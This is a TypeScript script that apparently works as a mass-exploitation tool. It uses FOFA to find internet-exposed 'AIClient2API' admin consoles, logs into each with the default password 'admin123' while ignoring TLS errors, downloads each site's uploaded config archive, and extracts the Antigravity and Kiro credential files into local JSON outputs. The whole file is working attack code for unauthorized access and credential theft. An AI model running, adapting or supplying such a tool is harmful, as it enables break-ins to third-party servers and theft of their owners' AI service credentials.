import { exit } from "process";
import { mkdir } from "fs/promises";
import AdmZip from "adm-zip";
import { validateConfig, queryFofa, logger, REQUEST_TIMEOUT, printBanner } from "../common";
import { concurrentProcess } from "../common/progress";

const LOGIN_PATH = "/api/login";
const DOWNLOAD_PATH = "/api/upload-configs/download-all";
const OUTPUT_DIR = "./output";
const defaultPassword = process.env.DEFAULT_PASSWORD || "admin123";

interface LoginResult { url: string; token: string; }
interface CredentialData { _source: string; _file: string; data: Record<string, any>; }
interface ExtractedData { antigravity: CredentialData[]; kiro: CredentialData[]; }

validateConfig();

async function tryLogin(url: string): Promise<LoginResult | null> {
    try {
        const res = await fetch(`${url}${LOGIN_PATH}`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ password: defaultPassword }),
            signal: AbortSignal.timeout(REQUEST_TIMEOUT),
            tls: { rejectUnauthorized: false },
        });
        if (!res.ok) return null;
        const data = await res.json() as any;
        return data.success && data.token ? { url, token: data.token } : null;
    } catch { return null; }
}

async function downloadAndExtract(login: LoginResult, index: number): Promise<ExtractedData> {
    const result: ExtractedData = { antigravity: [], kiro: [] };
    try {
        const res = await fetch(`${login.url}${DOWNLOAD_PATH}`, {
            headers: { Authorization: `Bearer ${login.token}` },
            signal: AbortSignal.timeout(REQUEST_TIMEOUT),
            tls: { rejectUnauthorized: false },
        });
        if (!res.ok) return result;

        const zip = new AdmZip(Buffer.from(await res.arrayBuffer()));
        for (const entry of zip.getEntries()) {
            if (entry.isDirectory || !entry.entryName.endsWith(".json")) continue;
            const parts = entry.entryName.split("/");
            const folder = parts.find((p: string) => p === "antigravity" || p === "kiro");
            if (!folder) continue;
            try {
                const jsonData = JSON.parse(entry.getData().toString("utf8"));
                if (jsonData && Object.keys(jsonData).length > 0) {
                    const cred: CredentialData = { _source: `site_${index}`, _file: parts[parts.length - 1], data: jsonData };
                    result[folder as keyof ExtractedData].push(cred);
                }
            } catch { /* skip invalid JSON */ }
        }
    } catch { /* download/extract failed */ }
    return result;
}

async function main() {
    printBanner("AIClient2API");

    try {
        const links = await queryFofa('title="AIClient2API - 管理控制台"');
        if (links.length === 0) { logger.warning("未找到任何站点"); return; }

        const loginResults = await concurrentProcess(
            links,
            `正在尝试登录 ${links.length} 个站点...`,
            tryLogin,
            null as LoginResult | null
        );
        const logins = loginResults.filter((r): r is LoginResult => r !== null);
        logger.success(`\n登录成功: ${logins.length} 个站点`);

        if (logins.length === 0) { logger.warning("没有站点登录成功"); return; }

        const extractResults = await concurrentProcess(
            logins,
            "正在下载并提取凭证...",
            (login) => downloadAndExtract(login, logins.indexOf(login)),
            { antigravity: [], kiro: [] } as ExtractedData
        );

        const merged: ExtractedData = { antigravity: [], kiro: [] };
        for (const r of extractResults) {
            merged.antigravity.push(...r.antigravity);
            merged.kiro.push(...r.kiro);
        }
        await mkdir(OUTPUT_DIR, { recursive: true });
        const files = {
            logins: `${OUTPUT_DIR}/aiclient2api-logins.json`,
            oauth: `${OUTPUT_DIR}/aiclient2api-antigravity.json`,
            kiro: `${OUTPUT_DIR}/aiclient2api-kiro.json`,
        };
        await Bun.write(files.logins, JSON.stringify(logins, null, 2));
        await Bun.write(files.oauth, JSON.stringify(merged.antigravity.map(c => c.data), null, 2));
        await Bun.write(files.kiro, JSON.stringify(merged.kiro.map(c => c.data), null, 2));

        logger.info("\n========================================");
        logger.success(`  站点数: ${links.length}  |  登录成功: ${logins.length}`);
        logger.success(`  Antigravity 凭证: ${merged.antigravity.length}  |  Kiro 凭证: ${merged.kiro.length}`);
        logger.success(`  输出目录: ${OUTPUT_DIR}/`);
        logger.info("========================================");
    } catch (error: any) {
        logger.error(`\n处理过程中发生错误: ${error.message}`);
        exit(1);
    }
}

main();
